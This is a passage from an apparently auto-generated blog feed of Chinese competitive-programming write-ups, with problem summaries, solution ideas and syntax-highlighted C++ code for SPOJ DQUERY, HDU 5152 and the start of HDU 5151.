class="keyword">int</span> N = <span class="number">30000</span> + <span class="number">10</span>;</div><div class="line"><span class="keyword">int</span> ln[N &lt;&lt; <span class="number">5</span>], rn[N &lt;&lt; <span class="number">5</span>], sum[N &lt;&lt; <span class="number">5</span>];</div><div class="line"><span class="keyword">int</span> tot, root[N], a[N];</div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> rt = ++tot;</div><div class="line">    sum[rt] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (l &lt; r) &#123;</div><div class="line">        <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">        ln[rt] = build(lson);</div><div class="line">        rn[rt] = build(rson);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> rt;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> pre, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> rt = ++tot;</div><div class="line">    ln[rt] = ln[pre], rn[rt] = rn[pre], sum[rt] = sum[pre] + <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (l &lt; r) &#123;</div><div class="line">        <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (x &lt;= m) ln[rt] = update(ln[pre], lson, x);</div><div class="line">        <span class="keyword">else</span> rn[rt] = update(rn[pre], rson, x);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> rt;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (l &gt;= k) <span class="keyword">return</span> sum[v] - sum[u];</div><div class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (k &lt;= m) ans += query(ln[u], ln[v], lson, k);</div><div class="line">    ans += query(rn[u], rn[v], rson, k);</div><div class="line">    <span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> n, m;</div><div class="line">    tot = <span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, a + i);</div><div class="line">    root[<span class="number">0</span>] = build(<span class="number">1</span>, n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (mp.find(a[i]) != mp.end()) root[i] = update(root[i - <span class="number">1</span>], <span class="number">1</span>, n, mp[a[i]]);</div><div class="line">        <span class="keyword">else</span> root[i] = root[i - <span class="number">1</span>];</div><div class="line">        mp[a[i]] = i;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</div><div class="line">    <span class="keyword">int</span> l, r;</div><div class="line">    <span class="keyword">while</span>(m--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;l, &amp;r);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, r - l + <span class="number">1</span> - query(root[l - <span class="number">1</span>], root[r], <span class="number">1</span>, n, l));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://www.spoj.com/problems/DQUERY/en/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.spoj.com/problems/DQUERY/en/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;查询区间内有几个不同的数&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/acm_cxlove/article/details/8562634&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/acm_cxlove/article/details/8562634&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;离线树状数组&lt;br&gt;将查询区间按左端点排序&lt;br&gt;对于相同的数，先更新最左边的位置&lt;br&gt;然后根据查询区间，不断更新next，保证查询区间内只记录一个位置&lt;br&gt;维护前缀和用树状数组，时空效率都高&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在线主席树&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/Empress/p/4675386.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/Empress/p/4675386.html&lt;/a&gt;&lt;br&gt;将重复的元素建树。在query的时候把区间内重复的数加起来，用区间长度(r-l+1)去减就是答案&lt;br&gt;(query的是[l, r]之间重复元素的个数)&lt;br&gt;举个例子：1 1 2 1 3 2 3&lt;br&gt;我们从左到右枚举，如果没有重复的，那么树的形态和之前一样，出现重复的则在重复的位置加1，建一颗新树&lt;br&gt;这样我们需要建7颗数&lt;br&gt; 1 2 3 4 5 6 7&lt;br&gt;T0:&lt;br&gt;T1:&lt;br&gt;T2: 1&lt;br&gt;T3: 1&lt;br&gt;T4: 1 1&lt;br&gt;T5: 1 1&lt;br&gt;T6: 1 1 1&lt;br&gt;T7: 1 1 1  1&lt;br&gt;例如查询区间[2，5] 就需要用T5-T1，但是不能直接减，直接减重复的数为2个1。需要统计的是区间[2,5]内重复的个数，正好为1个1.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="数据结构" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="树状数组" scheme="http://yoursite.com/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
      <category term="主席树" scheme="http://yoursite.com/tags/%E4%B8%BB%E5%B8%AD%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5152 A Strange Problem（线段树+数论）</title>
    <link href="http://yoursite.com/2015/10/13/hdu5152/"/>
    <id>http://yoursite.com/2015/10/13/hdu5152/</id>
    <published>2015-10-13T08:29:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5152" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5152</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>某天你收到了一个信封，信封里是一个奇怪的题目。首先给你一个长度为N的序列，序列为A1,A2,…,AN.然后有M个操作，每个操作为以下三种操作的其中一个：</p><ol><li>输出操作。给你l,r，输出区间和。</li><li>修改操作。给你x，把Ax修改为2^Ax</li><li>加法操作。给你l,r,x，区间加上​​x<br>由于输出操作的结果可能很大，输出结果对2333333取模。</li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>这道题复杂就是操作2。需要补充一个知识<br>指数循环节：当x &gt;= Phi(C)时, A^x = A ^ (x%Phi(C) + Phi(C)) (mod C). Phi(C)是C的欧拉函数，<br>对于2333333这个模数来说，求18次欧拉函数后就变成了1，所以只需要保存19层第三次操作的加数即可，然后就直接是线段树区间更新和询问操作了<br>参考题解写的代码，主要是计算操作二的时候，用一个vector记录某一位置操作二的个数，其实只需要记录最后的19个操作即可。具体细节见代码</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> lson l, m, rt &lt;&lt; 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rson m+1, r, rt &lt;&lt; 1 | 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">2333333</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">50005</span>;</div><div class="line"><span class="keyword">int</span> mo[<span class="number">20</span>] = &#123;<span class="number">2333333</span>, <span class="number">2196720</span>, <span class="number">580608</span>, <span class="number">165888</span>, <span class="number">55296</span>, <span class="number">18432</span>, <span class="number">6144</span>, <span class="number">2048</span>, <span class="number">1024</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">128</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</div><div class="line"><span class="keyword">int</span> pow2[<span class="number">33</span>];</div><div class="line"><span class="built_in">vector</span>&lt;ll&gt; vt[N];</div><div class="line">ll mark[N &lt;&lt; <span class="number">2</span>];</div><div class="line"><span class="keyword">int</span> len[N &lt;&lt; <span class="number">2</span>], sum[N &lt;&lt; <span class="number">2</span>];</div><div class="line"><span class="keyword">int</span> n, m;</div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> &amp;x, <span class="keyword">int</span> y)</span> </span>&#123;</div><div class="line">    x += y;</div><div class="line">    <span class="keyword">if</span> (x &gt;= mod) x -= mod;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">(<span class="keyword">int</span> rt)</span> </span>&#123;</div><div class="line">    sum[rt]  = sum[rt &lt;&lt; <span class="number">1</span>] + sum[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>];</div><div class="line">    add(sum[rt], <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">(<span class="keyword">int</span> rt)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (mark[rt]) &#123;</div><div class="line">        mark[rt &lt;&lt; <span class="number">1</span>] += mark[rt];</div><div class="line">        mark[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] += mark[rt];</div><div class="line">        add(sum[rt &lt;&lt; <span class="number">1</span>], <span class="number">1L</span>L * len[rt &lt;&lt; <span class="number">1</span>] * mark[rt] % mod);</div><div class="line">        add(sum[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>], <span class="number">1L</span>L * len[rt &lt;&lt; <span class="number">1</span> | <span class="number">1</span>] * mark[rt] % mod);</div><div class="line">        mark[rt] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt)</span> </span>&#123;</div><div class="line">    mark[rt] = <span class="number">0</span>;</div><div class="line">    len[rt] = r - l + <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (l == r) &#123;</div><div class="line">        <span class="keyword">int</span> x;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</div><div class="line">        vt[l].clear();</div><div class="line">        vt[l].pb(x);</div><div class="line">        sum[rt] = x % mod;</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">    build(lson);</div><div class="line">    build(rson);</div><div class="line">    up(rt);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R) <span class="keyword">return</span> sum[rt];</div><div class="line">    down(rt);</div><div class="line">    <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>, ret = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (L &lt;= m) add(ret, query(L, R, lson));</div><div class="line">    <span class="keyword">if</span> (R &gt; m) add(ret, query(L, R, rson));</div><div class="line">    up(rt);</div><div class="line">    <span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> v, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R) &#123;</div><div class="line">        mark[rt] += v;</div><div class="line">        add(sum[rt], <span class="number">1L</span>L * len[rt] * v % mod);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    down(rt);</div><div class="line">    <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (L &lt;= m) update(L, R, v, lson);</div><div class="line">    <span class="keyword">if</span> (R &gt; m) update(L, R, v, rson);</div><div class="line">    up(rt);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">pow_mod</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n, <span class="keyword">int</span> mod)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> ret = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(n) &#123;</div><div class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span>) ret = <span class="number">1L</span>L * ret * x % mod;</div><div class="line">        x = <span class="number">1L</span>L * x * x % mod;</div><div class="line">        n &gt;&gt;= <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="built_in">vector</span>&lt;ll&gt; &amp;v)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (v.size() &lt; <span class="number">19</span>) &#123;</div><div class="line">        <span class="keyword">int</span> pos = v.size() - <span class="number">1</span>;</div><div class="line">        ll ret = v[<span class="number">0</span>];</div><div class="line">        <span class="keyword">bool</span> flag = <span class="literal">false</span>;</div><div class="line">        <span class="keyword">if</span> (v[<span class="number">0</span>] &gt;= mo[pos]) &#123;</div><div class="line">            flag = <span class="literal">true</span>;</div><div class="line">            ret = ret % mo[pos] + mo[pos];</div><div class="line">        &#125;</div><div class="line">        pos--;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; v.size(); i++) &#123;</div><div class="line">            <span class="keyword">if</span> (flag) &#123;</div><div class="line">                ret = (pow_mod(<span class="number">2</span>, ret, mo[pos]) + v[i]) % mo[pos] + mo[pos];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">if</span> (ret &gt;= <span class="number">30</span> || pow2[ret] &gt;= mo[pos]) &#123;</div><div class="line">                    flag = <span class="literal">true</span>;</div><div class="line">                    ret = (pow_mod(<span class="number">2</span>, ret, mo[pos]) + v[i]) % mo[pos] + mo[pos];</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    ret = pow2[ret] + v[i];</div><div class="line">                    <span class="keyword">if</span> (ret &gt;= mo[pos]) &#123;</div><div class="line">                        flag = <span class="literal">true</span>;</div><div class="line">                        ret = ret % mo[pos] + mo[pos];</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            pos--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ret % mod;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        ll ret = <span class="number">1</span>;</div><div class="line">        <span class="keyword">int</span> pos = <span class="number">17</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = v.size() - <span class="number">18</span>; i &lt; v.size(); i++) &#123;</div><div class="line">            ret = (pow_mod(<span class="number">2</span>, ret, mo[pos]) + v[i]) % mo[pos] + mo[pos];</div><div class="line">            pos--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ret % mod;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> rt)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (l == r) &#123;</div><div class="line">        <span class="keyword">if</span> (mark[rt]) &#123;</div><div class="line">            vt[l][vt[l].size() - <span class="number">1</span>] += mark[rt];</div><div class="line">            mark[rt] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        vt[l].pb(<span class="number">0</span>);</div><div class="line">        sum[rt] = cal(vt[l]);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    down(rt);</div><div class="line">    <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (x &lt;= m) modify(x, lson);</div><div class="line">    <span class="keyword">else</span> modify(x, rson);</div><div class="line">    up(rt);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    pow2[<span class="number">0</span>] = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">30</span>; i++) pow2[i] = pow2[i - <span class="number">1</span>] &lt;&lt; <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> op, l, r, x;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m)) &#123;</div><div class="line">        build(<span class="number">1</span>, n, <span class="number">1</span>);</div><div class="line">        <span class="keyword">while</span>(m--) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;op);</div><div class="line">            <span class="keyword">if</span> (op == <span class="number">1</span>) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;l, &amp;r);</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, query(l, r, <span class="number">1</span>, n, <span class="number">1</span>));</div><div class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</div><div class="line">                modify(x, <span class="number">1</span>, n, <span class="number">1</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;l, &amp;r, &amp;x);</div><div class="line">                update(l, r, x, <span class="number">1</span>, n, <span class="number">1</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5152&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5152&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;某天你收到了一个信封，信封里是一个奇怪的题目。首先给你一个长度为N的序列，序列为A1,A2,…,AN.然后有M个操作，每个操作为以下三种操作的其中一个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;输出操作。给你l,r，输出区间和。&lt;/li&gt;
&lt;li&gt;修改操作。给你x，把Ax修改为2^Ax&lt;/li&gt;
&lt;li&gt;加法操作。给你l,r,x，区间加上​​x&lt;br&gt;由于输出操作的结果可能很大，输出结果对2333333取模。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;这道题复杂就是操作2。需要补充一个知识&lt;br&gt;指数循环节：当x &amp;gt;= Phi(C)时, A^x = A ^ (x%Phi(C) + Phi(C)) (mod C). Phi(C)是C的欧拉函数，&lt;br&gt;对于2333333这个模数来说，求18次欧拉函数后就变成了1，所以只需要保存19层第三次操作的加数即可，然后就直接是线段树区间更新和询问操作了&lt;br&gt;参考题解写的代码，主要是计算操作二的时候，用一个vector记录某一位置操作二的个数，其实只需要记录最后的19个操作即可。具体细节见代码&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="线段树" scheme="http://yoursite.com/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    
      <category term="数论" scheme="http://yoursite.com/tags/%E6%95%B0%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>HDU 5151 Sit sit sit（区间dp）</title>
    <link href="http://yoursite.com/2015/10/13/hdu5151/"/>
    <id>http://yoursite.com/2015/10/13/hdu5151/</id>
    <published>2015-10-13T06:58:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5151" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5151</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>有n个人陆续坐到n个椅子上，每张椅子为两种颜色中的一种。每个人每次可以选择一个空位置，如果该空位置两边都有人，且两边的椅子颜色不同，那么他便不能坐下，需要离开。现在问n个人全部坐下的方案数</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>dp[i][j]表示编号i-j的位置上都有人坐下的方案数。dp[i][i] = 1, dp[i][i+1] = 2<br>dp[i][j] =sum(dp[i][k-1] <em> dp[k+1][j] </em> C(j-i, k-i-1)) 当i-k-1有人坐下，k+1-j有人坐下，此时来的人坐在k的方案数累积<br>C(j-i, k-i-1)表示前面的j-i个人有k-i-1个人选择坐在了左边的方案数</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div 